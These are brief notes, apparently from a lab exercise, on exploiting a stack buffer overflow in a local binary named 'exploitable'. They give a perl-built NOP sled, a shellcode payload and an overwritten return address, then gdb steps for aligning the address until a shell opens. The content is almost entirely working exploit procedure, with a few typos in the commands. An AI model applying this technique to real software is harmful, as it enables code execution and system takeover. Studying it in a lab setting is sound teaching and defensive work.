

./exploitable $(perl -e 'print "\x90"x(placeholder1); cat shellcode; perl -e 'print "\xaa\xbb\xcc\xdd"x(placeholder2)')


placeholder 1: some calculated amt:
	buffer max is 35000, 34960~34980 is a good place to start,
	however ,it will change based on whether \xaa\xbb\xcc\xdd
	is aligned properly--->insert as little endian

placeholder 2: somewehere between 10~20


run with gdb: 
	gdb exploitable //opens gdb
	b 9 // break point at 9
	run $( perl -e ... same as above)
	x/16x buffer +34960 // look to see for line of 0x90909090 0x90909090...
	note the address -->make his \xaa\xbb\xcc\xdd
	/x16x buffer + 35000 //look for \xaa\xbb\xcc\xdd //align it
	rerun and:
	x/16x buffer +35000 look for address alignment
run again to exploit
use gdb command "bt" to debug
a shell should open upon success
